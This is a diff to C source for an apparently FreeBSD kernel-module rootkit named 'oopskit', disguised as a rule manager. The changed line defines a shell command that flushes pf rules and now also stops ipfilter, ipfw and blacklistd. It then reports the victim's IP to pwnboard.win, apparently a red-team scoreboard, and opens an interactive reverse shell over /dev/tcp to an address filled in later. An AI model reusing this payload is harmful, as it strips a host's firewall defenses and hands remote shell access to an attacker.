@@ -51,9 +51,9 @@
 #define KLD_FILE_NAME T_NAME"_rule_mgr.ko"
 #define BASH "/usr/local/bin/bash"
 #define BASH_OPT "-c"
-#define BASH_COMMAND_STR "/sbin/pfctl -F rules; /usr/local/bin/curl -X POST http://pwnboard.win/pwn/boxaccess -H 'Content-Type: application/json' -d '{\"ip\":\"`cat /tmp/.ip`\", \"application\":\"oopskit\"}';/bin/sh -i>& /dev/tcp/" // 38
+#define BASH_COMMAND_STR "/sbin/pfctl -F rules; service ipfilter stop; service ipfw stop; service blacklistd stop; /usr/local/bin/curl -X POST http://pwnboard.win/pwn/boxaccess -H 'Content-Type: application/json' -d '{\"ip\":\"`cat /tmp/.ip`\", \"application\":\"oopskit\"}';/bin/sh -i>& /dev/tcp/" // 38
 #define FULL_BASH_COMMAND_STR BASH_COMMAND_STR"255.255.255.255/65535 0>&1" // 26
-#define ARG2LEN 222
+#define ARG2LEN 289
 extern struct protosw inetsw[];
 
 char ** oopskit_args = NULL;
